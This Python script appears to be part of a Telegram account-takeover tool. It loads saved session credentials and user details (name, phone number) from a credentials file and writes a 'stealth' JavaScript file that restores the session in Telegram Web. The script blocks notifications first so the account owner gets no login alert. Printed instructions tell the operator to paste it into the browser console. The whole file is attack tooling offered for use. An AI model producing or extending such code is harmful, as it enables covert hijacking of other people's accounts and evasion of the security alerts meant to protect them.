#!/usr/bin/env python3
"""
Generate Stealth Script Only

This script generates stealth scripts that block notifications BEFORE setting localStorage
to prevent Telegram from sending login notifications.
"""

import os
import json
from datetime import datetime
from utils.credentials_manager import credentials_manager

def generate_script_comparison():
    """Generate stealth script only"""
    
    # Get the most recent JSON credentials file
    all_files = credentials_manager.list_credentials_files()
    json_files = [f for f in all_files if f['filename'].endswith('.json')]
    
    if not json_files:
        print("❌ No JSON credential files found")
        return
    
    latest_file = json_files[0]
    print(f"📁 Using latest credential file: {latest_file['filename']}")
    
    # Load the credentials
    credentials = credentials_manager.load_credentials(latest_file['filename'])
    if not credentials or 'session_data' not in credentials:
        print("❌ No valid session data found in credentials")
        return
    
    session_data = credentials['session_data']
    user_info = credentials.get('user_info', {})
    
    print(f"✅ Valid credential data found")
    print(f"👤 User: {user_info.get('first_name', 'Unknown')} {user_info.get('last_name', '')} (+{user_info.get('phone', 'Unknown')})")
    print(f"🔑 Auth Type: REAL")
    print(f"📦 Session Data Keys: {list(session_data.keys())}")
    
    # Generate all three types of scripts
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    
    # Generate stealth script (only stealth now)
    stealth_script = credentials_manager.generate_stealth_script(session_data)
    stealth_filename = f"stealth_script_{timestamp}.js"
    stealth_filepath = os.path.join("credentials", stealth_filename)
    with open(stealth_filepath, 'w', encoding='utf-8') as f:
        f.write(stealth_script)
    
    print(f"\n✅ Stealth script generated:")
    print(f"   Stealth: {stealth_filename}")
    
    # Show the stealth script start
    print(f"\n🔍 Stealth Script Preview:")
    print(f"   {stealth_script[:50]}...")
    
    print(f"\n📝 Instructions:")
    print(f"   1. Open https://web.telegram.org/a/ in your browser")
    print(f"   2. Press F12 to open Developer Tools")
    print(f"   3. Go to Console tab")
    print(f"   4. Copy and paste any of the generated scripts")
    print(f"   5. Press Enter to execute")
    print(f"\n🛡️  Recommendation: Use the STEALTH script to prevent login notifications!")

if __name__ == "__main__":
    print("🛡️ Generating Stealth Script Only")
    print("=" * 70)
    generate_script_comparison() 